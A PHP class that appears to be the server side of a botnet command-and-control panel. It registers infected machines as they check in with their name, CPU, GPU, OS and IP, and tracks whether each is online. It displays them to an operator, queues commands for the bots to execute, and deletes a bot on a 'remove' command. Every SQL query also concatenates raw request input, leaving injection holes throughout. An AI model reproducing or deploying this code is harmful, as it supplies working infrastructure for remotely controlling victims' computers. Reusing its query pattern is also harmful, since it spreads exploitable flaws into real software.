<?php
require_once('includes/connect.inc.php');
include('geoip.php');
include('titles.php');

class checkBots {

    private $db;
    private $shutdown;


    public function __construct(){

        $this->db = new Connection();
        $this->db = $this->db->dbConnect();

    }

    public function checkSession(){
        if(!isset($_SESSION['user']))
        {
            header('location: index.php');
        }
    }
	
    public function setCommand($cmd,$id)
    {
		if($cmd == 'remove')
		{
		$query = $this->db->prepare("UPDATE `users` SET `command` = 'remove' WHERE `id` = '".$id."' ");
		$query->execute();		
		}else{
        $query = $this->db->prepare("UPDATE `users` SET `command` = '".$cmd."' WHERE `id` = '".$id."' ");
        $query->execute();
		}
    }
	
	 public function getOnlinebots()
    {
        $maxtm = 10;
        $query = $this->db->prepare("SELECT * FROM users");
        $query->execute();
		$on = 0;
		$off = 0;
		
        while($row = $query->fetch(PDO::FETCH_ASSOC)){
           
               $PT = time() - $row['PT'];
               if($PT <= $maxtm ){
                    $on++;				
               }
			   else
			   {
					$off++;
			   }
			   
           
        }
        echo '<font color="green"> Online:<b>'.$on.'</b></font> / ';
		echo '<font color="red"> Offline:<b>'.$off.'</b></font>';
    }
	
	
    public function getPing($id)
    {
        $maxtm = 10;
        $ping = "<font color='red'>Offline</font>";
        $query = $this->db->prepare("SELECT * FROM users");
        $query->execute();
        while($row = $query->fetch(PDO::FETCH_ASSOC)){
           if($row['id'] == $id)
           {
               $PT = time() - $row['PT'];
               if($PT <= $maxtm ){
                    $ping = "<font color='green'>Online </font>";					
               }
			   
           }
        }
        return $ping;
    }
	
	
	public function onlineBots()
    {
		return $this->bot;
    }
	
	public function  setBotsCHK($chdid,$state,$pageid)
	{
		$query = $this->db->prepare("UPDATE `users` SET `pgid` = '".$pageid."', `chked` = '".$state."' WHERE `id` = '".str_replace("cmd_","",$chdid)."'");
        $query->execute();
	}
	
    public function getBots($pgid = null){
	
        $query = $this->db->prepare("SELECT * FROM users");
        $query->execute();
        while($row = $query->fetch(PDO::FETCH_ASSOC)){
			$chk = "";
			if($row['chked'] == "true")
			{
				if($pgid == $row['pgid'])
					$chk = "CHECKED";
			}
            $ping = $this->getPing($row['id']);
			if($ping != '<font color=\'red\'>Offline</font>'){
            echo '<tr><td align="center"><input onclick="chked(this);" type="checkbox" id="foo" name="cmd_'.$row['id'].'" '.$chk.'/></td><td align="center"><img src="classes/img.php?ip='.$row['IP'].'"></td><td align="center">'.$row['pcname'].'</td><td align="center">'.$row['IP'].'</td><td align="center">'.$row['os'].'</td><td align="center">'.($row['command'] == "NULL" ? "Ready" : "Executing: ".$row['command']).'</td><td align="center">'.$ping.'</td></tr>';
			}else
			{
				$query2 = $this->db->prepare("UPDATE `users` SET `pgid` = '0', `chked` = 'false' WHERE `id` = '".$row['id']."'");
				$query2->execute();
			}
			
		}		
    }
	
	public function countBots(){
	
		$query = $this->db->prepare("SELECT * FROM users");
        $query->execute();
		$bots = $query->rowCount();
		return $bots;

	}

    public function checkShutdown(){
            $r = $this->shutdown;

            return $r;
    }

    public function updateInfo() {

        $milliseconds = time();//round(microtime(true) * 1000);
        $command = "NULL";
        $ex = false;

        $ip = $_SERVER['REMOTE_ADDR'];
        $pc_name = $_GET['pcnaam'];
        $pc_cpu = $_GET['cpu'];
        $pc_gpu  = $_GET['gpu'];
		$winos  = $_GET['winos'];
		$uni  = $_GET['uni'];
        $query = $this->db->prepare("SELECT * FROM users");
        $query->execute();



        while($row = $query->fetch(PDO::FETCH_ASSOC)){
          if($row['uni'] == $uni)
          {
              $command = $row['command'];
              $ex = true;
          }
        }

		
		
        if($ex){
			
            $query = $this->db->prepare("UPDATE `users` SET `os` = '".$winos."',`PT` = '".$milliseconds."',`command` = 'NULL',`gpu` = '".$pc_gpu."',`cpu` = '".$pc_cpu."',`pcname` = '".$pc_name."' WHERE `uni` = '".$uni."' ");
            $query->execute();
        }else{
            $query = $this->db->prepare("INSERT INTO `users` (`PT`,`command`,`gpu`,`cpu`,`pcname`,`IP`,`os`,`uni`) VALUES ( '".$milliseconds."','NULL', '".$pc_gpu."','".$pc_cpu."', '".$pc_name."' , '".$ip."', '".$winos."','".$uni."') ");
            $query->execute();
        }

		if($command == "remove" )
		{
			$query = $this->db->prepare("DELETE FROM users WHERE `uni` = '".$uni."' ");
			$query->execute();
		}
        return $command;
    }
}

?>